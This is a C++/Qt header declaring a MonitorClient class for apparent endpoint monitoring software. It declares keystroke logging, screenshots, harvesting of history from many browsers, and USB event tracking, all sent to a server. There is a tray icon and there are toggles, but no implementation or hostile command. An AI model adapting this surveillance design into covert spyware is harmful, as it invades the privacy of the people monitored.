#ifndef MONITORCLIENT_H
#define MONITORCLIENT_H

#include <QObject>
#include <QTimer>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QJsonArray>
#include <QJsonObject>
#include <QJsonDocument>
#include <QSqlDatabase>
#include <QSqlQuery>
#include <QSqlError>
#include <QDir>
#include <QFile>
#include <QTextStream>
#include <QStandardPaths>
#include <QStorageInfo>
#include <QSysInfo>
#include <QScreen>
#include <QGuiApplication>
#include <QDebug>
#include <QProcess>
#include <QDateTime>
#include <QTimeZone>
#include <QMutex>
#include <QEventLoop>
#include <QStorageInfo>
#include <QNetworkInterface>
#include <QDBusInterface>
#include <QDBusReply>
#include <QDBusConnection>
#include <QSystemTrayIcon>
#include <QMenu>
#include <QAction>
#include <QIcon>
#include <libudev.h>

#include "KeyboardMonitor.h"
#include "functions.h"
#include "ConfigDialog.h"

class MonitorClient : public QObject
{
    Q_OBJECT

public:
    MonitorClient();
    ~MonitorClient();

public slots:
    int getScreen();
    int sendTic();
    int sendBrowserHistories();
    int sendKeyLogs();
    int sendUSBLogs();
    void handleKeyPress(qint64 timestamp, const QString &windowTitle, const QString &keyText);
    void handleUsbEvent();
    void run();
    void enableScreenshot(bool enabled);
    void enableKeylog(bool enabled);
    void enableBrowserHistory(bool enabled);
    void enableUsbMonitoring(bool enabled);
    
    // System tray slots
    void onTrayIconActivated(QSystemTrayIcon::ActivationReason reason);
    void onSendAllAction();
    void onConfigureAction();
    void onTakeScreenshotAction();
    void onTestConnectionAction();
    void onTestAPIEndpointsAction();

signals:
    void screen();
    void tic();
    void browserHistory();
    void keyLog();
    void usbLog();
    void usbEvent();

private:
    QString getMacAddress();
    QString getDeviceInfo(struct udev_device* dev);
    void processUsbEvent(struct udev_device* dev);
    void grabEntireDesktop(QString path, QPixmap& res, bool& ok);
    void grabScreen(QString filePath, bool& ok);
    int sendScreens(QString filePath);
    void getStorageDevices();
    void setupUsbMonitoring();
    void cleanupUsbMonitoring();
    qint64 convertUnixtimestampToBrowserTime(const QString& browserName, const qint64 unixtimestamp);
    void updateLastCheckedTime(const QString& browserName, const qint64 timestamp);
    QList<QList<QJsonObject>> chunkData(const QList<QJsonObject>& data, int chunkSize);
    void queryBrowserHistory(const QString& dbPath, const QString& query, const QString& browserName);
    QStringList getMozBasedProfilePaths(const QString& browserPath);
    QStringList getChromiumBasedProfilePaths(const QString& browserPath);
    void getFirefoxHistory();
    void getChromeHistory();
    void getEdgeHistory();
    void getOperaHistory();
    void getBraveHistory();
    void getMidoriHistory();
    void getYandexHistory();
    void getSlimjetHistory();
    void getFalkonHistory();
    void getBrowserHistory();
    QString getJsonObjectListAsJsonString(const QList<QJsonObject>& jsonObjectList);
    qint64 getLastCheckedTime(const QString& browserName);
    QString getFieldNameForVisitTime(const QString& browserName);
    void getVivaldiHistory();
    int sendDataChunk(const QString& serverIP, int serverPort, const QString& eventType, const QString& dataField, const QString& data);
    bool isInterruptionRequested();
    int checkActiveScreen();
    
    // System tray methods
    void setupSystemTray();
    void cleanupSystemTray();
    void updateTrayIcon();
    void updateTrayMenu();
    void showConnectionError(const QString& error);
    bool testServerConnection();
    void updateStatusDisplay();
    QString formatLastSentTime(const QDateTime& time);
    QString getLocalIPAddress();
    bool testBasicConnectivity(const QString& host, int port);
    bool testAPIEndpoints(const QString& serverIP, int serverPort);

    QString macAddress;
    int screenInterval;
    int lastBrowserTic;
    KeyboardMonitor *keyboardMonitor;
    
    // USB monitoring
    struct udev *udev;
    struct udev_monitor *monitor;
    int udevFd;
    QMap<QString, QString> usbDeviceInfo;
    
    // Storage monitoring
    QList<QStorageInfo> storageDevices;
    
    // Data storage
    QList<QJsonObject> keyLogs;
    QList<QJsonObject> usbLogs;
    QList<QJsonObject> browserHistories;
    QMap<QString, qint64> lastCheckedTimes;
    
    // Network manager
    QNetworkAccessManager *networkManager;
    
    // System tray
    QSystemTrayIcon *trayIcon;
    QMenu *trayMenu;
    QAction *statusAction;
    QAction *sendAllAction;
    QAction *configureAction;
    QAction *screenshotAction;
    QAction *testConnectionAction;
    QAction *testAPIEndpointsAction;
    bool serverConnected;
    QString lastError;
    QString clientName;
    
    // Status tracking
    bool screenshotEnabled;
    bool keylogEnabled;
    bool browserHistoryEnabled;
    bool usbMonitoringEnabled;
    
    // Last sent times
    QDateTime lastKeySentTime;
    QDateTime lastUsbSentTime;
    QDateTime lastBrowserSentTime;
    QDateTime lastScreenshotSentTime;
    
    // Connection error tracking
    bool connectionErrorNotified;
    
    // Database
    QSqlDatabase db;
};

#endif // MONITORCLIENT_H 